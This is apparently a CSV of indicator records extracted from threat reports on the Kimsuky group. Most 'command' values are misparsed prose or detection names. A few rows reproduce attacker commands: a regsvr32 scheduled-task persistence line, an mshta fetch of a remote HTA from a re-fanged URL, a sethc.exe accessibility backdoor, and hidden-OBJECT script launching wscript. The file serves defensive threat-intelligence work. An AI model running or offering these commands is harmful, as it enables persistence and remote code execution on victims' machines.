schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--kimsuky,artifact--sha256:ac9f29ec6856848329138bf4834b2555a4162cf03cceb2b377f644b73de03af6,observation--sha256:634682e29d65cab7e5dc473f1a4bbe6e07b40068c514b0951681c06b93a0e47d,command,"- schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\","- schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 15}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 15VIRUS BULLETIN CONFERENCE OCTOBER 2021  Mutex name - windows update server real time mui cache - windows update {2020-1050-01-01-0001-I}  Scheduler - schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\ Driverdriver.cfg""""/sc minute /mo30  The path to the file is finally downloaded and executed - %APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender  C&C add",
1.0.0,actor--kimsuky,artifact--sha256:706b1b7ffb3c24d8a1ed46d59d48db1fedf6541ad91723fa92582bfbb4654a71,observation--sha256:9acf9ead82f4e9321ea281b8cf8a1a052b4e3b56274c8d2d55942f9dbddfe94f,command,1 下载 Dll 模块使用 regsvr32 加载执行,1 下载 Dll 模块使用 regsvr32 加载执行,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 c 上传截图 d 上传文件 e 上传键盘记录、屏幕截图、文件监控、USB 监控数据 f 下载文件 0 CmdShell 1 下载 Dll 模块使用 regsvr32 加载执行 2 内存加载执行 PE 模块 3 下载文件并执行 其中键盘记录、屏幕截图、文件监控、USB 监控被放到单独线程中执行，除键盘记录 为即时监控外，文件监控频率为 60 秒，屏幕监控频率为 300 秒。而在文件监控中，木马针 对 txt、hwp、pdf、doc、xls、ppt 文档类型文件进行窃取，表明攻击者对此类文件非常感兴 趣。 图[13].窃取文件流程中特定的文档类型 3.4 间谍模块-Android 文件名称 Kisa Vaccine.apk SHA256 fe1a734019f0dc714bd3360e2369853ea97c02f108afe96376931893447 0967b,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8e4c1bc6062feb7c9a610fb0701f214083a73f73d36f08e2467e4789aea43e0e,observation--sha256:f20ab1839d2da133349440fac8c8806ece4c26be9a5464c6c9ff9dd919849c91,command,1. Downloads a PowerShell script from Google Drive and writes to disk as,1. Downloads a PowerShell script from Google Drive and writes to disk as,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 It is worthy to note that when double-clicking msc files on default windows systems there is a User Account Control (UAC) warning that may hinder an attack. Figure 10 - A CommandLine Task in the .msc In the screenshot above showing an MSC CommandLine Task payload: 1. Open Google Docs lure 2. Execute tasklist and write results to file 3. Echo VBScript to disk 4. Execute VBScript The VBScript in this example simply POSTs collected process information to the server. Despite this being a simple e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d00597002af2dc1eeb3a1efa28d961bba2faead9f5bbc180ce80e653069c6147,observation--sha256:b663f8162601961769dcf4106a09369b6d93160a095044d71fccf3bf39761dbf,command,4 使用 “sh -c”对 cmd_xxxxx.dat 的内容进行执行，把执行结果,4 使用 “sh -c”对 cmd_xxxxx.dat 的内容进行执行，把执行结果,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[20]. 响应 C2 服务器远程指令 命令 动作 1 会提醒用户更新并进行更新操作 2 创建了 list.xls 和 zip.dat ，并遍历/sdcard 目录及其子文件夹下的 所有文件，把文件信息写入了 list.xls 3 上传指定的文件 4 使用 “sh -c”对 cmd_xxxxx.dat 的内容进行执行，把执行结果 写入 cmd_xxxxx.txt ,经过相同的伪装，调用 c.d() 上传 5 创建 sms.txt ，调用安卓短信协议，获取信息写入 sms.txt 6 清除 app 的数据 7 清除 app 的缓存 8 发送短信 3.5 攻击韩国原子能研究所 韩国新闻媒体《朝鲜日报》近日报道韩国原子能研究院于 5 月 14 日遭到朝鲜 APT 组 织 Kimsuky 攻击。韩国原子能研究院拥有核电站、核燃料等重要国防资料。根据披露信息 显示，攻击者利用原子能研究院 VPN 设备漏洞进入内网，使用了 13 个未经授权的外部 IP 访问 VPN 内部网络。",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e0c39b1eca625fc4447e38c4fbc9af00cc7f24f8f0748d249fabfc5ac0c5eaa1,observation--sha256:9e0065af82a75b4c28ffccf736d8af2e0a79e9deca2dae2de0008e68248464ba,command,4. 유사도분석(SimilarityAnalysis)..................................................284.1. 타임라인(Timeline).........................................................................284.2. VBS1유형.....................................................................................294.3. JSE1유형......................................................................................334.4. VBS2유형.....................................................................................364.5. JSE2유형......................................................................................404.6. JSE3유형......................................................................................484.7. 기타유형........................................................................................514.8. 경로및파일명유사도...................................................................... 534.9. HTML코드유사도...........................................................................544.10. Powershell 코드유사도..................................,4. 유사도분석(SimilarityAnalysis)..................................................284.1. 타임라인(Timeline).........................................................................284.2. VBS1유형.....................................................................................294.3. JSE1유형......................................................................................334.4. VBS2유형.....................................................................................364.5. JSE2유형......................................................................................404.6. JSE3유형......................................................................................484.7. 기타유형........................................................................................514.8. 경로및파일명유사도...................................................................... 534.9. HTML코드유사도...........................................................................544.10. Powershell 코드유사도,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 2}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport - 목차(CONTENTS) - 1. 개요(Overview)...........................................................................21.1. 위협식별(Threat Hunting)............................................................... 21.2. 공격전술및전략유형(TTPs)............................................................. 3 2. 공격시나리오(AttackScenario)....................................................32.1. 공격흐름도(AttackFlowchart)..........................................................32.2. 초기접근단계-피싱(Initial Acces,
1.0.0,actor--kimsuky,artifact--sha256:1a0ff74e537175005705c357a011108042732472148bfefd00e7fd09eef348fd,observation--sha256:19b432ecf557ede474f8313b71a7c8dd987cc0b9c7b1d72abcac11972b615d77,command,4.10. Powershell 코드유사도,4.10. Powershell 코드유사도,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 56}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport </SCRIPT> inner;A.Click(); inner ='<OBJECTid=""B""classid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" style=""visibility:hidden"">';inner +='<PARAMname=""Command""value=""ShortCut""><PARAMname=""Button""value=""Bitmap:shortcut"">';inner +='<PARAMname=""Item1""value="",wscript,C:\\Users\\Public\\Libraries\\Docs.jseP""><PARAMname=""Item2""value=""273,1,1""></OBJECT>';document.getElementById('par').innerHTML=inner;B.Click(); </script> [표4-3] HTML코드유사도 4.10. Powershell 코드유사도 ○VBS 와JSE 유형모두Pow",
1.0.0,actor--kimsuky,artifact--sha256:474103f643f393114175033182f943eaf8fbd3f7586d7e9c0a1ee1f011b99f54,observation--sha256:6af3d2d53f7fae18e5ad5f3b2ef4fb169952efd93b9a62bed0cce1b25fd72646,command,6.0 5D56371944DEC9DA57DB95D0199DD920 9722107FFF4F3B2255556E0CF4D367CCB73305C34B1746BAED31B16899EEFC4B Powershell Keylogger,6.0 5D56371944DEC9DA57DB95D0199DD920 9722107FFF4F3B2255556E0CF4D367CCB73305C34B1746BAED31B16899EEFC4B Powershell Keylogger,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--09cb3954225ee2bb,kimsuky/Unveil the evolution of Kimsuky targeting Android device with newly discovered mobile malware.xlsx,"{""row"": 7, ""sheet"": ""IoC""}",[],[],[],[],0,false,medium,TLP:CLEAR,xlsx-row,6.0 5D56371944DEC9DA57DB95D0199DD920 9722107FFF4F3B2255556E0CF4D367CCB73305C34B1746BAED31B16899EEFC4B Powershell Keylogger,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:51b5ec093fdf4ae241bfa06c5a5b33b822f813f17babe114279096c703c9c0fb,observation--sha256:17c64c2df42b3a7c8a9175fb25d445d3a5db52aac56cf07f7afc0e10557ebc1d,command,6.4 Signed binary proxy execution: Regsvr32,6.4 Signed binary proxy execution: Regsvr32,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 15}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 15VIRUS BULLETIN CONFERENCE OCTOBER 2021  Mutex name - windows update server real time mui cache - windows update {2020-1050-01-01-0001-I}  Scheduler - schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\ Driverdriver.cfg""""/sc minute /mo30  The path to the file is finally downloaded and executed - %APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender  C&C add",
1.0.0,actor--kimsuky,artifact--sha256:b2d1c8ec7cf843662d7500e50e1740fcd9b3191d6cdd1a437cdf0a1fb4bbfd15,observation--sha256:b386a2b2971f895e604db039d5a10d5f5b93394fe8a81605e35e70f1ed4dbeb6,command,As an example: below we can see implementation of a decoded PowerShell payload,As an example: below we can see implementation of a decoded PowerShell payload,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 It is worthy to note that when double-clicking msc files on default windows systems there is a User Account Control (UAC) warning that may hinder an attack. Figure 10 - A CommandLine Task in the .msc In the screenshot above showing an MSC CommandLine Task payload: 1. Open Google Docs lure 2. Execute tasklist and write results to file 3. Echo VBScript to disk 4. Execute VBScript The VBScript in this example simply POSTs collected process information to the server. Despite this being a simple e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1f613e8cade6c6be0229458668aa20dcacc76e33427d7b820f5656342c4d3b07,observation--sha256:3d0fea34530d0dfe6d0f857cba2989191423001a1698c636e612860473650f58,command,Backdoor/Powershell.Agent (2020.10.06.00),Backdoor/Powershell.Agent (2020.10.06.00,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c6b088ce9d0b4e2b51b072cacc16d9b4163e2eec4ae149d5aaf9c77369abc6e4,observation--sha256:e102c01da9a1f4a6982dcf7fd3c466a895d32ec72ed5638e162affefd9600166,command,CommandandScriptingInterpreter:PowerShell,CommandandScriptingInterpreter:PowerShell,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 64}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport 7. 공격지표(Indicator of Attack)7.1. MITREATT&CKMatrix Tactic Technique Description Reconnaissance T1598.002 Phishingfor Information: SpearphishingAttachmentT1598.003 Phishingfor Information: SpearphishingLinkResourceDevelopment T1585.002 EstablishAccounts: Email AccountsT1585.003 EstablishAccounts: CloudAccounts Initial Access T1566.002 Phishing: SpearphishingLinkT1566.003 Phishing: SpearphishingviaService Execution T1059.001 CommandandScriptingInterpreter:PowerShell T1059,
1.0.0,actor--kimsuky,artifact--sha256:1ec149d76c47b8e4846529f3ff6a31545cab5e7f91c32d35fa8cda5cbe05dcbd,observation--sha256:eac2d51822cc5cd0dd89b755f7e5b75f8b4289ec10c7648bfb48ade26997f5cb,command,Downloader/Powershell.Kimsuky.SC188250 (2023.05.08.02),Downloader/Powershell.Kimsuky.SC188250 (2023.05.08.02,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e57c648ea91e0c5b08b07de7a5797842d49fddba44fdc336e99a0a1844447429,observation--sha256:72658650890a0062dde07c6ab74e7fd0f47ba85b52a9252d4da43f0ad9b0ec3a,command,"Ex) ""cmd.exe /c takeown /f \""sethc.exe\""&icacls \""sethc.exe\"" /grant SYSTEM:f&ren sethc.exe","Ex) ""cmd.exe /c takeown /f \""sethc.exe\""&icacls \""sethc.exe\"" /grant SYSTEM:f&ren sethc.exe",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c2f3b0735d873845cbe165ef74994a42b02a0ab8936608b460a003a23aeeebcc,observation--sha256:ce66410109da5efe1a2fafd7c52db60b5217c5d3cb0631e692dfa48933f51a3d,command,"Ex) ""mshta.exe hxxps://floridas.000webhostapp.com/set.hta","Ex) ""mshta.exe https://floridas.000webhostapp.com/set.hta",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3a8e9cfecfb97cdcfd3cb81b7991f39b8355e570dc40d6e04939c197198c6ce9,observation--sha256:fe33b9d839814c1fdee190a845403ff66755c3045f9bb7fb1781ae3d1c994af8,command,"File, required when malicious Powershell scripts run","File, required when malicious Powershell scripts run",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"[+] (Ministry of Unification) North Korea Information Portal: ua.zip hxxps://nkinfo.unikorea.go.kr/nkp/term/skNkItTerm.do?pageIndex=32 (Table 15) At the time of recognizing the purpose of the Cook folder, namastte, only show.php existed, so it was difficult to determine the exact upload method or its relationship with other files, but it was confirmed in the analysis of other cases. Malware that uses show.php is shown below (Figure 26). I found a North Korean expression in the comments of index.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2b2fbf5c2aa9645ec133864097608482fb36d63e6194eb5fcadfc2c9add9379e,observation--sha256:98b166f66c8ffd0af66dc8c1e12d64ffed70960f2ebe8416ed28e74fab8b22f9,command,"In particular, the above figure shows that the function styles used by PowerShell as well as the file names","In particular, the above figure shows that the function styles used by PowerShell as well as the file names",candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 12}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"[Figure 6] Comparison of malicious scripts found home and abroad In particular, the above figure shows that the function styles used by PowerShell as well as the file names ('expres.php?op=1', 'cow.php?op=1"") and parameters used to communicate with the C2 server are very similar in both scripts.",
1.0.0,actor--kimsuky,artifact--sha256:464339ccced7d527ad862885f96495b09c9dde08cecd98322d3bf1f63272c488,observation--sha256:8a2fdbd6f4cd45857d08dc9802535bd3310f8bc4b11f0c84d51a03dfbda1d6c9,command,Infostealer/Powershell.Browser.SC186288,Infostealer/Powershell.Browser.SC186288,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:464339ccced7d527ad862885f96495b09c9dde08cecd98322d3bf1f63272c488,observation--sha256:274676273f8662ed5bce8877028954536bee438520c358fb0da32588a3833d0b,command,Infostealer/Powershell.Browser.SC186288,Infostealer/Powershell.Browser.SC186288,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1cf19b3b1708c092be3f3d01ccfb9f234887a1ef92fdc9c53a4293d0952a14e4,observation--sha256:26f7138358df17c611b27528dc4863e9864138f3fa7447e46d8759e5d9f084bd,command,Keylogger/PowerShell.Agent.SC188884 (2023.05.24.00),Keylogger/PowerShell.Agent.SC188884 (2023.05.24.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:cd88ad4ea33e2136a1977025d3612dff5884257ec3e2e2bab8282f3c96f5a066,observation--sha256:61259116a9567dfa2d242ea21a672b5a39ed7cd764c58e8c6e7eb33e409a0bc0,command,Keylogger/Powershell.Agent,Keylogger/Powershell.Agent,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0c5c20b747aad28d6bb9376c69aa573128a49765c2c37cd1e986d857640982f0,observation--sha256:d3987235cf77abc57b316abbafc3ef4c729d6f0dc2a6faed7e7061b154875bd4,command,"Macros inserted into files and documents, Powershell scripts provided as Windows functions, and Windows system commands","Macros inserted into files and documents, Powershell scripts provided as Windows functions, and Windows system commands",candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 81}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"domain_x64.dll hxxps://www.bleepingcomputer.com/news/security/microsoft-to-kill-off-vbscript-in-windows-to-block- Macros inserted into files and documents, Powershell scripts provided as Windows functions, and Windows system commands Diagnostic Time File Name 2023-02-24 Removing VBS will not have a significant impact on hacking organizations. The reason is that even if the hacking organization is not VBS, hxxps://learn.microsoft.com/en-us/windows/whats-new/deprecated-features The malicious code ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:99d5174072e0d9f820ede63e5458abfb23d59061640238c435a325f565b9a0a7,observation--sha256:e9a9f1126d76cd6d61e60af7df42a9cbb8699b03f2573929f9be7a35f7f67008,command,"Phishing disguised as normal URL frequently used by the target, Hangul, MS Office document files, executable files, scripts, Powershell,","Phishing disguised as normal URL frequently used by the target, Hangul, MS Office document files, executable files, scripts, Powershell",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 1) Hacking email sent to North Korea support staff Operation Covert Stalker Report The Kimsuky organization, which is backed by the state, hacks various fields such as North Korea, politics, diplomacy, security, national defense, medicine, and finance to steal email accounts or important data from specific people or organizations, mainly using an effective means such as email. hacking On Friday, April 29, 2022, around the time of work, AhnLab disclosed analysis information titled ""Distri",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b1ea0e3564772aeac207b88ddf0a5044747b6b8cc2713a3cd10cb594a3eb2a91,observation--sha256:c930357171daa9f512d415aa58d303ca9fbbfa55b15f3f6a7ee0323829304b3b,command,PowerShell commands in the earlier and open source versions. Rapid7 notes,PowerShell commands in the earlier and open source versions. Rapid7 notes,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 Figure 5 - Most recent Kimsuky LNK format Rapid7 tracked this toolmark to a now removed post by @x86matthew sharing a POC named EmbedExeLnk. This post was shared in 2022, several months before the first Kimsuky variant and it’s easy to see similarities like -bxor 0x77 and other PowerShell commands in the earlier and open source versions. Rapid7 notes attribution on this toolmark alone is not satisfactory for attribution as there are several other examples of LNK building tools based on @x86mat",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:166905db2a5a2065eb8d3d6cf93bb3f086469c17fcd5a8a6209ffe162957fa1d,observation--sha256:391cba8e589a795d1c04520dd7c720950c3c52ad94df87907444ad0572d25d4d,command,PowerShell process.,PowerShell process,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"12 Figure 11 - Stage 1 payload executes via scheduled task and opens RTF lure Figure 12 - Stage 2 payload downloads obfuscated gzip payload, extracts and loads in memory The second stage reflectively loads XeroRAT as a final payload. The script: 1. Defines GzExtract function to gunzip a byte array. 2. Downloads an obfuscated gzip payload from google drive. The payload has an RTF magic file header, likely as a way to bypass suspicious file type controls. 3. Replaces first 7 bytes with Gzip magic ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c545739720aa6233676ff25db9ee6665d3504abc9ad0694e48805ddfc6d02eb9,observation--sha256:e46f90fde5daa3c33256d2c3527d0ceb1e290e91f3cfbe840d443976b114682f,command,"PowerShell to extract to %temp% before execution. Similarly, a previous version","PowerShell to extract to %temp% before execution. Similarly, a previous version",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 Rapid7 also observed a recent version with an embedded payload that uses PowerShell to extract to %temp% before execution. Similarly, a previous version of Kimsuky LNK payloads uses the same embedded payload method of extraction with heavily obfuscated PowerShell substitution. Figure 7 - Heavily obfuscated embedded payload variant Rapid7 observed several techniques to bypass lazy signatures or tooling limitations: • Move towards in-memory execution to limit dropping malware binaries on disk • ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8216252a61bbe06c352ac453a83505fb4831266d0b928ecdd40ab48b9f7a7b19,observation--sha256:fca54b633a2ebe49dfe6c64be8ba7159b662ce68f906d554e7bea5614172afc2,command,"PowerShell, but are stripped with the cmd.exe stage of the process tree.","PowerShell, but are stripped with the cmd.exe stage of the process tree",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 Rapid7 also observed a recent version with an embedded payload that uses PowerShell to extract to %temp% before execution. Similarly, a previous version of Kimsuky LNK payloads uses the same embedded payload method of extraction with heavily obfuscated PowerShell substitution. Figure 7 - Heavily obfuscated embedded payload variant Rapid7 observed several techniques to bypass lazy signatures or tooling limitations: • Move towards in-memory execution to limit dropping 